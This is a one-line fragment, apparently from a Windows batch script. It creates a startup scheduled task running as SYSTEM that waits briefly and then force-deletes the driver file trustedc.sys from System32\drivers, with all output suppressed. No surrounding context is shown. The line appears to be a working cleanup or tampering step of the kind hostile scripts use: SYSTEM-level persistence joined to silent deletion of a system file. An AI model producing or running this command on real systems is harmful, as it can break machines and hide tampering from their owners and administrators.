...
schtasks /create /tn "DeleteDriverOnStartup" /tr "cmd.exe /c ping 127.0.0.1 -n 21 >nul && del /f /q C:\Windows\System32\drivers\trustedc.sys" /sc ONSTART /ru "SYSTEM" /f >nul 2>&1
